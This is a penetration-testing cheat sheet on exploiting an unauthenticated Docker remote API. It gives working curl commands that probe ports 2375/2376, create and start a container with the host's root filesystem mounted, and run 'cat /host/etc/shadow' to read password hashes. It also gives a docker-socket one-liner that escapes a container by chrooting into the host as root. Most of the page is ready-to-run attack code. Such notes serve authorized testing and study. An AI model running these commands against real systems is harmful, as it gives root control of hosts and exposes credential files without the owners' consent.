# Docker API

**What it is:** Docker's remote management API. If exposed without authentication (which happens more than it should), you can create containers, mount the host filesystem, and escape to the host as root.

**Default ports:** 2375 (HTTP), 2376 (HTTPS)

**Vuln research:**
- [Docker Security](https://docs.docker.com/engine/security/)
- [HackTricks — Docker](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation.html)

---

### Check for exposed Docker API

Unauthenticated access — Full host compromise

```bash
curl http://$IP:2375/version
curl http://$IP:2375/containers/json
```

<details>
<summary>Example Output</summary>

```json
{"Version":"20.10.7","ApiVersion":"1.41","Os":"linux","Arch":"amd64"}
If you see this = full Docker control without authentication
```
</details>

---

### Mount host filesystem and get root

Create a container with host root mounted — Read/write everything

```bash
# List images:
curl http://$IP:2375/images/json

# Create container with host root mounted:
curl -X POST http://$IP:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"<image_name>","Cmd":["/bin/bash"],"Binds":["/:/host"],"Tty":true}'

# Start container:
curl -X POST http://$IP:2375/containers/<container_id>/start

# Exec into container:
curl -X POST http://$IP:2375/containers/<container_id>/exec -H "Content-Type: application/json" -d '{"Cmd":["cat","/host/etc/shadow"],"AttachStdout":true}'
```

---

### Docker socket escape

If you're inside a container with /var/run/docker.sock mounted

```bash
# Check:
ls -la /var/run/docker.sock

# Use docker client inside container:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
```

---
